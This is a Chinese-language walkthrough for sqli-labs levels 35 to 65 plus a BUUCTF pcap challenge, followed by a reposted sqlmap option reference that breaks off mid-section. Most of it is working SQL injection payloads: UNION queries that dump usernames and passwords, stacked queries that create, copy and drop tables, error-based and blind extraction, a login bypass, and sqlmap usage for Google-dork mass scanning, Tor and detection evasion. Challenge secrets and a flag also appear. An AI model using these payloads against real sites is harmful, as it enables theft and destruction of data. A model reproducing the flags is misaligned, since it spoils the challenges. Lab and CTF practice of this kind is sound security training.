--+\u0026amp;passwd=\u0026amp;submit=Submit uname=1%df\u0026#39; UNION SELECT group_concat(concat_ws(0x3a,username,password)),2 FROM security.users--+\u0026amp;passwd=\u0026amp;submit=Submit Less-35-宽字节注入-数字型 直接用 ORDER BY 排序，网页回显正常数据，确定是数值型注入。由于数值型注入不涉及任何编码问题，因此任何转义操作都形同虚设。\nsql\r1 2 3 4 ?id=1 ORDER BY 3--+ #直接获取数据 ?id=-1 UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users--+ Less-38-堆叠注入 这一关可以用Less-1的payload就可以获取数据，\nsql\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ?id=1 ?id=1\u0026#39; ?id=1\u0026#39; --+ ?id=1\u0026#39; order by 3 --+ ?id=1\u0026#39; order by 4 --+ ?id=-1\u0026#39; union select 1,2,3 --+ ?id=-1\u0026#39; union select 1,database(),3 --+ ?id=-1\u0026#39; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=\u0026#39;security\u0026#39;--+ ?id=-1\u0026#39; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=0x7365637572697479--+ # 0x7365637572697479 代替 \u0026#39;security\u0026#39;,通过十六进制编码 避免单引号使用，绕过转义和过滤机制。 ?id=-1\u0026#39; union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=\u0026#39;security\u0026#39; and table_name=\u0026#39;users\u0026#39;--+ ?id=-1\u0026#39; union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=0x7365637572697479 and table_name=0x7573657273--+ ?id=-1\u0026#39; UNION SELECT 1,group_concat(concat_ws(\u0026#39;:\u0026#39;,username,password)),3 FROM security.users--+ ?id=-1\u0026#39; UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users--+ 但这一关是用来练习堆叠注入的\n堆叠注入（Stacked Queries Injection）是一种允许攻击者在一次数据库请求中执行 多条SQL语句 的注入技术。其核心是利用SQL语句的分隔符（如分号 ;）拼接恶意代码，常用于执行任意数据库操作（增删改查）。\n堆叠注入原理\n基本条件\n数据库支持多语句执行：\nMySQL默认情况下 不支持 堆叠注入（需特定驱动或配置，如PHP的mysqli_multi_query）。\nSQL Server、PostgreSQL等数据库通常支持。 **应用程序未过滤分号 **;：\n若代码直接拼接用户输入且未过滤分号，攻击者可插入分号分隔多条SQL语句。 所谓堆叠注入就是在原语句后加上分号，从而闭合前面的内容作为第一条 SQL 语句。然后在后面输入第二条的数据库操作语句，在条件允许可以被后端带入数据库执行。堆叠注入使用的范围非常有限，例如后端可能会限制 SQL 只执行一条语句。一旦这种漏洞存在，对数据库的破坏性是毁灭性的，因为这表示攻击者可以肆意对数据库进行操作。\n例如此处使用堆叠注入新建一张表，使用 CREATE TABLE 子句，该表将复制 users 表作为一张新的表存在。这种复制可以结合 SQL 注入爆出表名来复制，也可以用社会工程学来猜测。\nsql\r1 ?id=1\u0026#39;;CREATE TABLE WhiteMoon LIKE users;--+ 网页回显正常的信息，打开数据库发现security库中已经多了一张whitemoon表了。\n使用堆叠查询把 users 表中的数据插入新的表中，使用 INSERT INTO 子句实现。\nsql\r1 ?id=1\u0026#39;;INSERT INTO WhiteMoon SELECT * FROM users;--+ 使用堆叠查询新建的表的所有记录删掉，使用 DELETE 子句实现。\nsql\r1 ?id=1\u0026#39;;DELETE FROM WhiteMoon;--+ 使用堆叠查询把新建的表删掉，使用 DROP 子句实现。\nsql\r1 ?id=1\u0026#39;;DROP TABLE WhiteMoon;--+ Less-39,41-堆叠注入-数字型 sql\r1 2 3 4 ?id=1;CREATE TABLE WhiteMoon LIKE users;--+ ?id=1;INSERT INTO WhiteMoon SELECT * FROM users;--+ ?id=1;DELETE FROM WhiteMoon;--+ ?id=1;DROP TABLE WhiteMoon;--+ Less-40-堆叠注入-\u0026rsquo;) ?id=1\t正常\n?id=1\u0026rsquo;\t不显示\n?id=1\u0026quot;\t正常\nid=1)\t不显示\nid=1\u0026rsquo;)\t不显示\nid=1\u0026quot;）\t正常\nid=1\u0026rsquo;))\t不显示\nsql\r1 2 3 4 ?id=1\u0026#39;);CREATE TABLE WhiteMoon LIKE users;--+ ?id=1\u0026#39;);INSERT INTO WhiteMoon SELECT * FROM users;--+ ?id=1\u0026#39;);DELETE FROM WhiteMoon;--+ ?id=1\u0026#39;);DROP TABLE WhiteMoon;--+ Less-42,43,44,45-堆叠注入/二次注入 用户名测试什么都没有，密码测试直接登录成功\na\u0026rsquo; OR 1 = 1#\n可以在已知某个用户的用户名的条件下使用万能密码夺取用户，也可以使用二次注入（Less-24）进行攻击。由于密码参数没有进行防御，可以在该字段测试堆叠注入。使用 Less-38 的测试流程，每次登陆时完成一步堆叠注入。\nsql\r1 2 3 4 a\u0026#39; OR 1 = 1;CREATE TABLE WhiteMoon LIKE users;# a\u0026#39; OR 1 = 1;INSERT INTO WhiteMoon SELECT * FROM users;# a\u0026#39; OR 1 = 1;DELETE FROM WhiteMoon;# a\u0026#39; OR 1 = 1;DROP TABLE WhiteMoon;# Less-46-报错注入-数字型-页面不返回回显 ?sort=1\n?sort=2\n?sort=3\n?sort=4\t报错，存在报错注入，可以利用这个漏洞去获取其他数据\n报错注入：\nsql\r1 2 3 4 5 6 7 8 9 ?sort=1 AND updatexml(1,concat(\u0026#34;!\u0026#34;,database()),2)# ?sort=1 AND updatexml(1,concat(\u0026#34;!\u0026#34;,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = \u0026#39;security\u0026#39;)),2)# ?sort=1 AND updatexml(1,concat(\u0026#34;!\u0026#34;,(SELECT group_concat(c2olumn_name) FROM information_schema.columns WHERE table_schema = \u0026#39;security\u0026#39; AND table_name = \u0026#39;emails\u0026#39;)),2)# ?sort=1 AND updatexml(1,concat(\u0026#39;!\u0026#39;,(SELECT concat_ws(\u0026#39;:\u0026#39;,id,email_id) FROM (SELECT id,email_id FROM emails)text LIMIT 0,1)),1)# ?sort=1 AND updatexml(1,concat(\u0026#39;!\u0026#39;,(SELECT concat_ws(\u0026#39;:\u0026#39;,id,email_id) FROM (SELECT id,email_id FROM emails)text LIMIT 1,1)),1)# Less-47-报错注入-\u0026rsquo;-页面不返回回显 sql\r1 2 3 4 5 6 7 8 9 ?sort=1\u0026#39; AND updatexml(1,concat(\u0026#34;!\u0026#34;,database()),2) --+ ?sort=1\u0026#39; AND updatexml(1,concat(\u0026#34;!\u0026#34;,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = \u0026#39;security\u0026#39;)),2) --+ ?sort=1\u0026#39; AND updatexml(1,concat(\u0026#34;!\u0026#34;,(SELECT group_concat(c2olumn_name) FROM information_schema.columns WHERE table_schema = \u0026#39;security\u0026#39; AND table_name = \u0026#39;emails\u0026#39;)),2) --+ ?sort=1\u0026#39; AND updatexml(1,concat(\u0026#39;!\u0026#39;,(SELECT concat_ws(\u0026#39;:\u0026#39;,id,email_id) FROM (SELECT id,email_id FROM emails)text LIMIT 0,1)),1) --+ ?sort=1\u0026#39; AND updatexml(1,concat(\u0026#39;!\u0026#39;,(SELECT concat_ws(\u0026#39;:\u0026#39;,id,email_id) FROM (SELECT id,email_id FROM emails)text LIMIT 1,1)),1) --+ Less-48-时间盲注-数字型 经过测试，这一关是数字型注入，页面不返回报错信息，要使用时间盲注\nsql\r1 2 3 4 5 ?sort=1 AND IF(LENGTH(database())=8,sleep(1),1)--+ ?sort=1 AND IF(LEFT((SELECT database()), 1)=\u0026#39;s\u0026#39;,sleep(1),1)--+ ?sort=1 AND IF(LEFT((SELECT database()), 8)=\u0026#39;security\u0026#39;,sleep(1),1)--+ Less-49-时间盲注-\u0026rsquo; sql\r1 2 3 4 5 ?sort=1\u0026#39; AND IF(LENGTH(database())=8,sleep(1),1)--+ ?sort=1\u0026#39; AND IF(LEFT((SELECT database()), 1)=\u0026#39;s\u0026#39;,sleep(1),1)--+ ?sort=1\u0026#39; AND IF(LEFT((SELECT database()), 8)=\u0026#39;security\u0026#39;,sleep(1),1)--+ Less-50,52 输入正常的参数，网页回显用户名列表。对 sort 参数使用单引号闭合，网页返回错误信息。\nsql\r1 ?sort=1\u0026#39; 和 Less 46 一样使用报错注入或时间注入就可以完成，此处用于测试堆叠注入。使用堆叠查询完成 Less 38 的样例。\nsql\r1 2 3 4 ?sort=1;CREATE TABLE WhiteMoon LIKE users;--+ ?sort=1;INSERT INTO WhiteMoon SELECT * FROM users;--+ ?sort=1;DELETE FROM WhiteMoon;--+ ?sort=1;DROP TABLE WhiteMoon;--+ Less-51,53 此处存在单引号闭合的字符型注入。\nLess 47 一样使用报错注入或时间注入就可以完成，此处用于测试堆叠注入。\nsql\r1 2 3 4 ?sort=1\u0026#39;;CREATE TABLE WhiteMoon LIKE users;--+ ?sort=1\u0026#39;;INSERT INTO WhiteMoon SELECT * FROM users;--+ ?sort=1\u0026#39;;DELETE FROM WhiteMoon;--+ ?sort=1\u0026#39;;DROP TABLE WhiteMoon;--+ Less-54-联合查询注入(十次限制)-\u0026rsquo; sql\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #判断得知为字符型注入: ?id=1\u0026#39; and 1=1 --+ #判断字段数 ?id=1\u0026#39; order by 3 --+ #爆当前数据库和用户名 ?id=0\u0026#39; union select 1,user(),database() --+ #爆当前数据库下的所有表 ?id=0\u0026#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+ #这里的表每一次都是随机给出的/dtbzuzk1tk/ #爆字段 ?id=0\u0026#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=\u0026#39;dtbzuzk1tk\u0026#39; --+ #字段也是随机/secret_S7T1/ #爆数据，取/secret_****/段为过关数据 ?id=0\u0026#39; union select 1,database(),group_concat(0x7e,sessid,0x7e,secret_S7T1) from dtbzuzk1tk --+ Less-55-联合查询注入(十四次限制)-) sql\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #判断得知为字符型注入: ?id=1) and 1=1 --+ #判断字段数 ?id=1) order by 3 --+ #爆当前数据库和用户名 ?id=0) union select 1,user(),database() --+ #爆当前数据库下的所有表 ?id=0) union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+ #这里的表每一次都是随机给出的/k4slr3jkz6/ #爆字段 ?id=0) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=\u0026#39;k4slr3jkz6\u0026#39; --+ #字段也是随机/secret_OBJS/ #爆数据，取/secret_****/段为过关数据 ?id=0) union select 1,database(),group_concat(0x7e,sessid,0x7e,secret_OBJS) from k4slr3jkz6 --+ Less-56-联合查询注入(十四次限制)-\u0026rsquo;） sql\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #判断得知为字符型注入: ?id=1\u0026#39;) and 1=1 --+ #判断字段数 ?id=1\u0026#39;) order by 3 --+ #爆当前数据库和用户名 ?id=0\u0026#39;) union select 1,user(),database() --+ #爆当前数据库下的所有表 ?id=0\u0026#39;) union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+ #这里的表每一次都是随机给出的/k4slr3jkz6/ #爆字段 ?id=0\u0026#39;) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=\u0026#39;k4slr3jkz6\u0026#39; --+ #字段也是随机/secret_OBJS/ #爆数据，取/secret_****/段为过关数据 ?id=0\u0026#39;) union select 1,database(),group_concat(0x7e,sessid,0x7e,secret_OBJS) from k4slr3jkz6 --+ Less-57-联合查询注入(十四次限制)-\u0026quot; sql\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #判断得知为字符型注入: ?id=1\u0026#34; and 1=1 --+ #判断字段数 ?id=1\u0026#34; order by 3 --+ #爆当前数据库和用户名 ?id=0\u0026#34; union select 1,user(),database() --+ #爆当前数据库下的所有表 ?id=0\u0026#34; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+ #这里的表每一次都是随机给出的/4wlhf91tdn/ #爆字段 ?id=0\u0026#34; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=\u0026#39;4wlhf91tdn\u0026#39; --+ #字段也是随机/secret_WCBG/ #爆数据，取/secret_****/段为过关数据 ?id=0\u0026#34; union select 1,database(),group_concat(0x7e,sessid,0x7e,secret_WCBG) from 4wlhf91tdn --+ Less-58-报错注入（五次限制）-\u0026rsquo; sql\r1 2 3 4 5 6 7 8 9 10 11 #获得表名：之前已经知道数据库的名字是challenges ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;CHALLENGES\u0026#39;) ),1)--+ #获取字段： ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name=\u0026#39;rropvsv2k3\u0026#39; )),1)--+ #获取字段的值： ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(secret_NP44) from challenges.rropvsv2k3 )),1)--+ mNPc5dq8hrv47LdDXgFFjiJe Less-59-报错注入（五次限制）-数字型 sql\r1 2 3 4 5 6 7 8 9 10 11 #获得表名： ?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;CHALLENGES\u0026#39;) ),1)--+ #获取字段： ?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name=\u0026#39;jzhybgbqrz\u0026#39; )),1)--+ #获取字段的值： ?id=1 and updatexml(1,concat(0x7e,(select group_concat(secret_F0VL) from challenges.jzhybgbqrz )),1)--+ V4AyD7JBzbT2AdCUcw1OlmAg Less-60-报错注入（五次限制）-\u0026quot;) sql\r1 2 3 4 5 6 7 8 9 10 11 #获得表名： ?id=1\u0026#34;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;CHALLENGES\u0026#39;) ),1)--+ #获取字段： ?id=1\u0026#34;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name=\u0026#39;801z2q3ff4\u0026#39; )),1)--+ #获取字段的值： ?id=1\u0026#34;) and updatexml(1,concat(0x7e,(select group_concat(secret_9N7R) from challenges.801z2q3ff4 )),1)--+ Iy2k37ZvBStuGa5Xq0b8aUGy Less-61-报错注入（五次限制）-\u0026rsquo;)) sql\r1 2 3 4 5 6 7 8 9 10 11 #获得表名： ?id=1\u0026#39;)) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;CHALLENGES\u0026#39;) ),1)--+ #获取字段： ?id=1\u0026#39;)) and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name=\u0026#39;v9gnhvugn2\u0026#39; )),1)--+ #获取字段的值： ?id=1\u0026#39;)) and updatexml(1,concat(0x7e,(select group_concat(secret_9EHB) from challenges.v9gnhvugn2 )),1)--+ s1DwpRlu1CKlzFP65tuY5DkN Less-62-盲注-\u0026rsquo;) 此处union和报错注入都已经失效了，那我们就要使用盲注了。\n爆当前数据库的长度: plain\r1 2 3 4 ?id=1\u0026#39;) and length(database())\u0026gt;8 # 正确 ?id=1\u0026#39;) and length(database())\u0026gt;9 # 正确 ?id=1\u0026#39;) and length(database())\u0026gt;10 # 错误 ?id=1\u0026#39;) and length(database())=10 # 正确 得数据库长度为 10\n爆数据库的每一位字符: plain\r1 ?id=1\u0026#39;) and ascii(mid(database(),1,1))=99 # 爆当前数据库所有表的个数: plain\r1 ?id=1\u0026#39;) and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 第一个表的长度: plain\r1 ?id=1\u0026#39;) and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))\u0026gt;5 # 第一个表的每一个字符: plain\r1 ?id=1\u0026#39;) and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=78 # 得到表名为: N18FOKJDNC\n爆第一个字段名的长度: plain\r1 ?id=1\u0026#39;) and length((select column_name from information_schema.columns where table_name=\u0026#39;N18FOKJDNC\u0026#39; limit 0,1))=2 # 爆第一个字段名的每一个字符: plain\r1 ?id=1\u0026#39;) and ascii(mid((select column_name from information_schema.columns where table_name=\u0026#39;N18FOKJDNC\u0026#39; limit 0,1),1,1))=105 # 最后得第一个字段名为: id\n然后依次爆得第二、三、四个字段名分别为: sessid,secret_BDFP, tryy\n爆secret_BDFP字段值的长度: plain\r1 ?id=1\u0026#39;) and (select length(secret_BDFP) from N18FOKJDNC)=24 # 爆每一个值: plain\r1 ?id=1\u0026#39;) and ascii(mid((select secret_BDFP from N18FOKJDNC),1,1))=113 # 最后得值为: qAAMVVGX0thxbmsazGMxOlFe\nLess-63-盲注-\u0026rsquo; 注入点改变，其他于Less-62一样\nLess-64-盲注-数字 注入点改变，其他于Less-62一样\nLess-65-盲注-\u0026quot; 注入点改变，其他于Less-62一样\nBUUCTF在线评测sqltest\n得到一个.pcapng文件，双击在Wireshark中打开\n根据题目，这是sql攻击，\n导出http对象并过滤ascii\n布尔盲注一般用substr()切割每个字符串，并一个一个地用ascii()转成ASCII码来判断，以爆出真正的数据，但是substr()也用于判断表名、字段名的长度，所以这里直接过滤ascii，方便之后的分析\n这里的780和848俩个字节，是HTTP请求内容的实际数据长度（即服务器接收或发送的HTTP协议载荷大小）\n780可能是没有成功的，\u0026gt;101返回true（848），\u0026gt;102返回false（780），说明第一个字符的ASCII码为101\n所以每次找最后一个就对了：\n102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125 flag{47edb8300ed5f9b28fc54b0d09ecdef7}\nsqlmap 下载和安装：\nsqlmap：自动 SQL 注入和数据库接管工具\nkali操作系统自带sqlmap，可以直接输入sqlmap执行。\nsqlmap命令详解 转载自： 全栈程序员站长 原文：https://cloud.tencent.com/developer/article/2148285\n目录 0x01 sqlmap 确定目标 1.1 直连数据库 1.2 URL探测 1.3 文件读取目标 1.4 Google 批量扫描注入 0x02 sqlmap 请求参数设置（一） 2.1 设置 HTTP 方法 2.2 设置 POST 提交参数 2.3 设置参数分割符 2.4 设置Cookie 头 2.5 设置 User-Agent 头 2.6 设置 Host 头 2.7 设置 Referer 头 2.8 设置 额外 HTTP 头 2.9 设置 HTTP 协议认证 2.10 设置 HTTP 代理 0x03 sqlmap 请求参数设置（二） 3.1 设置Tor隐藏网络 3.2 设置延时 3.3 设置超时 3.4 设置重传次数 3.5 设置随机化参数 3.6 设置日志过滤目标 3.7 设置忽略 401 3.8 设置 HTTP 协议私钥 3.9 设置安全模式 3.10 设置忽略URL编码 0x04 sqlmap 性能优化 4.1 设置持久 HTTP 连接 4.2 设置 HTTP 空连接 4.3 设置多线程 4.5 设置预测输出 0x05 sqlmap 注入位置介绍 5.0 注入介绍 5.1 设置指定注入参数 5.2 设置URL注入位置 5.3 设置任意注入位置 0x06 sqlmap 注入参数 6.1 强制设置 DBMS 6.2 强制设置 OS 6.3 关闭负载转换机制 6.4 关闭字符转义机制 6.5 强制设置无效值替换 6.6 自定义注入负载位置 6.7 设置 Tamper 脚本 6.8 设置 DBMS 认证 0x07 sqlmap 自定义检测参数 7.1 设置探测等级 7.2 设置风险参数 7.3 设置页面比较参数 7.4 设置内容比较参数 0x08 sqlmap 注入技术参数 8.1 设置具体 SQL 注入技术 8.2 设置时间盲注延迟时间 8.3 设置 UNION 字段数 8.4 设置 UNION 字符 8.5 设置 UNION 查询表 8.6 设置 DNS 露出攻击 8.7 设置二次注入 8.8 识别指纹 0x09 sqlmap 检索 DBMS 信息 9.1 检索 DBMS Banner 信息 9.2 检索 DBMS 当前用户 9.3 检索 DBMS 当前数据库 9.4 检索 DBMS 当前主机名 0x0A sqlmap 枚举 DBMS 信息 10.1 探测当前用户 DBA 10.2 枚举 DBMS 用户 10.3 枚举 DBMS 用户密码 10.4 枚举 DBMS 权限 10.5 枚举数据库名 10.6 枚举数据库表 10.7 枚举数据库表的列名 10.8 枚举数据值 0x0B sqlmap 枚举信息 11.1 枚举 schema 信息 11.2 枚举数据表数量 11.3 获取数据信息 11.4 设置条件获取信息 11.5 暴力激活成功教程数据 11.6 读取文件 11.7 写入文件 11.8 检索所有信息 0x0C sqlmap 系统参数 12.1 执行系统命令 12.2 结合Metasploit 12.3 注册表介绍 12.4 注册表操作 0x0D sqlmap 通用参数（一） 13.1 加载 sqlite 会话文件 13.2 加载 http 文本文件 13.3 设置默认选择选项 13.4 执行系统命令 13.5 设置盲注字符集 13.6 爬取 URL 13.7 在 CSV 输入中使用的分割字符 13.8 设置输出格式 13.9 探测之前检测 Internet 连接 13.10 解析和测试表单的输入字段 0x0E sqlmap 通用参数（二） 14.1 设置预计完成时间 14.2 刷新会话文件 14.3 忽略会话中的存储结果 14.4 使用 Hex 函数检索数据 14.5 设置自定义输出路径 14.6 从响应页面解析错误 14.7 强制设置 DBMS 编码 14.8 存储 HTTP 流量到 HAR 14.9 筛选具体 Payload 14.10 过滤具体 Payload 0x0F sqlmap 杂项参数 15.1 使用缩写助记符 15.2 设置探测预警 15.3 设置问题答案 15.4 发现 SQL 注入预警 15.5 其他 0x10 常用 Tamper 脚本 0x01 sqlmap 确定目标 1.1 直连数据库 sqlmap支持直接连接数据库，通过以下命令来直连\n服务型数据库（前提知道数据库用户名和密码） DBMS://USER:PASSWORD@DBMS_PORT/DATABASE_NAME （MySQL，Oracle，Microsoft SQL Server，PostgreSQL，etc）\n例如： python sqlmap.py -d “mysql://admin:admin@192.168.1.2:3306/security” -f –banner\n文件型数据库（前提知道数据库的绝对路径） DBMS://DATABASE_FILEPATH (SQLite，Microsoft Access，Fire bird，etc)\n1.2 URL探测 sqlmap直接对单一URL探测，使用参数 -u 或 –url URL格式：http(s): //targeturl [:port] /[…]\n例如： python sqlmap.py -u http://www.target/vuln.php?id=1 –banner\n1.3 文件读取目标 sqlmap支持从不同类型的文件中读取目标进行SQL注入探测 1、-l 从BurpSuite Proxy或从WebScarab Proxy中读取HTTP请求日志\n查看burpsuite抓取的日志信息\n使用sqlmap进行演示\n2、-x 从sitemap.xml站点地图文件中读取目标探测\n3、-m 从多行文本格式文件读取多个目标\n4、-r 从文本文件中读取HTTP请求作为SQL注入探测目标\n将burp suite抓取的HTTP请求信息，复制到txt文件中，在使用sqlmap -r ‘txt文件’ 进行探测\n5、-c 从配置文件 sqlmap.conf 中读取目标探测 查看sqlmap.conf 文件的内容\n将想要探测目标的url填入该文件中，里面也可以通过日志文件形式（相当于使用 -l 参数）、HTTP请求文件（相当于使用 -r 参数）进行探测，还可以设置其他参数，例如：method(HTTP请求方法)、data（指定POST提交的数据）等等\n接下来，我们将目标url填入sqlmap.conf文件，进行演示 python sqlmap.py -c sqlmap.conf –banner\n1.4 Google 批量扫描注入 sqlmap通过 -g 自动利用Google获取指定Google hack的目标，然后利用交互向导模式进行SQL注入探测\n例如： python sqlmap.py -g “inurl:.php?id=”\n0x02 sqlmap 请求参数设置（一） 2.1 设置 HTTP 方法 Sqlmap会自动在探测过程中使用适合的HTTP请求方法。但是在某些具体情况下，需要强制使用具体的HTTP请求方法。例如 PUT请求方法。HTTP PUT请求方法不会自动使用，因此需要我们强制指定。使用 –method=PUT。\n例如： python sqlmap.py -u “http://192.168.1.2/sqlilabs/Less-1/?id=1” –method=get –banner\n2.2 设置 POST 提交参数 默认情况下，用于执行HTTP请求的HTTP方法是GET，但是您可以通过提供在POST请求中发送的数据隐式地将其更改为POST。这些数据作为这些参数，被用于SQL注入检测。 例如： python sqlmap.py -u “http://www.target.com/vuln.php” –data=“id=1” -f –banner –dbs –users\n-f fingerprint 指纹\n演示： python sqlmap.py -u “http://192.168.1.2/sqlilabs/Less-11/” –data=“uname=admin\u0026amp;passwd=admin\u0026amp;submit=Submit” -p uname -f –banner\n2.3 设置参数分割符 在某些情况下，sqlmap需要覆盖默认参数分隔符(例如\u0026amp; in GET和POST数据)，才能正确地分割和单独处理每个参数。\n例如： python sqlmap.py -u “http://www.target.com/vuln.php” –data=“query=foobar;id=1” –param-del=”;” -f –banner –dbs –users\n演示： python sqlmap.py -u “http://192.168.1.2/sqlilabs/Less-11/” –data=uname=“admin\u0026amp;passwd=admin\u0026amp;submit=Submit” –param-del=”\u0026amp;” -p uname -f –banner\n2.4 设置Cookie 头 Sqlmap中用来设置Cookie的参数：–cookie, –cookie-del, –load-cookies –drop-set-cookie\n使用场景： 1、Web应用程序具有基于Cookie验证的过程； 2、想利用Cookie值上的SQL注入漏洞。\nSqlmap使用Cookie过程： 1、登录或浏览页面。 2、打开审计工具或代理截断，复制Cookie。 3、在Sqlmap中使用 –cookie 粘贴Cookie。\npython sqlmap.py -u “http://192.168.1.2/sqlilabs/Less-11/” –data=“uname=admin\u0026amp;passwd=admin\u0026amp;submit=Submit” -p uname -f –banner\n如果在通信过程中，web应用程序使用Set-Cookie标头进行响应，sqlmap将在所有进一步的HTTP请求中自动使用其值作为Cookie标头。sqlmap还将为SQL注入自动测试这些值。这可以通过提供–drop-set-cookie—sqlmap将忽略任何即将到来的Set-Cookie头来避免。 反之亦然，如果您提供了一个带有选项的HTTP Cookie报头—Cookie和目标URL在任何时候发送一个HTTP set -Cookie报头，sqlmap将询问您要为以下HTTP请求使用哪组Cookie。\nload-cookie，可以用来提供包含Netscape/wget格式的cookie的特殊文件\n注意：如果需要对HTTP Cookie值进行SQL注入探测，需要设置 –level 2以上（3）。\n2.5 设置 User-Agent 头 默认情况下， sqlmap使用以下用户代理头值执行HTTP请求: sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org) （使用Wireshark 抓包查看）\n然而， 通过提供自定义用户代理作为选项的参数， 可以使用选项—user-agent来伪造它。（可使用burpsuite抓取正常的HTTP请求包获取User-Agent头的信息）\nsqlmap -u “http://192.168.1.2/sqlilabs/Less-1/?id=1” –user-agent ” Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0″ 再次抓包查看\n此外， 通过 –random-agent, sqlmap将从./txt/user-agent中随机选择一个用于会话中的所有HTTP请求。一些站点在服务端检测HTTP User-Agent值， 如果不是一个合法的值， 就会中断连接。 同时Sqlmap也会曝出错误。\n演示： sqlmap -u “http://192.168.1.2/sqlilabs/Less-1/?id=1” –random-agent 抓包查看\n注意针对User-Agent的值探测SQL注入， 需要设置–level 值为3。或者，使用Burp Suite抓包，将HTTP请求信息复制到txt文件中，然后在要User-Agent头的后面加上一个 * 号，这样不使用—level 3 也能够对User-Agent头进行探测\n2.6 设置 Host 头 可以手动设置HTTP主机头值。 默认情况下， 从提供的目标URL解析HTTP主机头\n注意， 如果 –level设置为5,将对HTTP主机头进行SQL注入检测。\n2.7 设置 Referer 头 伪造HTTP Referer值是可能的。 默认情况下， 如果没有显式设置， HTTP请求中不会发送HTTP引用头。 请注意， 如果–level设置为3或以上， 将针对HTTP引用头 进行SQL注入测试（或在请求信息中要进行探测的位置后面加上*号）\n2.8 设置 额外 HTTP 头 通过设置选项–header， 可以提供额外的HTTP标头。 每个标头必须用换行符（\\n）分隔， 从配置INI文件中提供它们要容易得多。 可以查看示例sqlmap.conf文件。\n例如： python sqlmap.py -u “http://192.168.21.128/sqlmap/mysql/get_int.php?id=1” –headers=“Host:www.target.com\\nUser-agent:Firefox 1.0” -v 5\n以Sqli-Labs靶场的Sqli-Less1为例 将User-Agent设为：haha 将cookie设为:heihei\nsqlmap -u “http://192.168.1.2/sqlilabs/Less-1/?id=1” –headers=“user-agent:haha\\ncookie:heihei”\n2.9 设置 HTTP 协议认证 Sqlmap中设置HTTP协议认证的参数： –auth-type和–auth-cred\n其中–auth-type支持 Basic、 Digest、 NTLM\n–auth-cred认证语法为： username:password （用于需要账号密码登录的页面）\n例如： python sqlmap.py -u “http://url/arit.php?id=1” –auth-type Basic –auth-cred “testuser:testpass”\n2.10 设置 HTTP 代理 Sqlmap中设置代理的参数： –proxy, –proxy-cred, –proxy-file ， –ignore-proxy\n其中–proxy用来设置HTTP代理服务器位置 格式： –proxy http(s): //ip[:端口]\n–proxy-cred用来设置HTTP代理服务器认证信息 格式： –proxy-cred username:password\n–proxy-file用来设置多条代理在文件中\n–ignore-proxy当您希望通过忽略系统范围内的HTTP(S)代理服务器设置来针对本地网络的目标部分运行sqlmap时， 应该使用这种方法。\n0x03 sqlmap 请求参数设置（二） 3.1 设置Tor隐藏网络 Sqlmap中设置Tor网络的参数： –tor –tor-port –tor-type（共有四种类型：HTTP、HTTPS、SOCKS4、SOCKS5） –check-tor\n3.2 设置延时 Sqlmap探测过程中会发送大量探测Payload到目标， 如果默认情况过快的发包速度回导致目标预警或断开连接。 为了避免这样的情况发生， 可以在探测设置Sqlm1ap发包延迟。 默认情况下， 不设置延迟。 –delay 0.5 设置延迟0.5秒\n3.3 设置超时 在考虑超时HTTP(S)请求之前， 可以指定等待的秒数。 有效值是一个浮点数， 例如10.5表示10秒半。 默认设置为30秒。 例如： –timeout 10.5\n3.4 设置重传次数 –retries count 设置对应重试次数， 默认情况下重试3次。（通常与超时参数结合使用）\n3.5 设置随机化参数 Sqlmap可以指定要在每次请求期间随机更改其值的参数名称。 长度和类型根据提供的原始值保持一直。 –randomize 参数名称\n例如：\n3.6 设置日志过滤目标 与使用选项-l使用从提供的日志解析的所有主机不同， 您可以指定有效的Python正则表达式， 用于过滤所需的日志。\n例如： python sqlmap.py -l burp.log –scope=”(www)?.target.(com|net|org)”\n–scope= ” 正则表达式 “\n3.7 设置忽略 401 –ignore-401 参数用来忽略未验证错误。\n如果您想测试偶尔返回HTTP错误401(未经授权的)的站点，而您想忽略它并在不提供适当凭证的情况下继续测试，您可以使用–ignore-401\n3.8 设置 HTTP 协议私钥 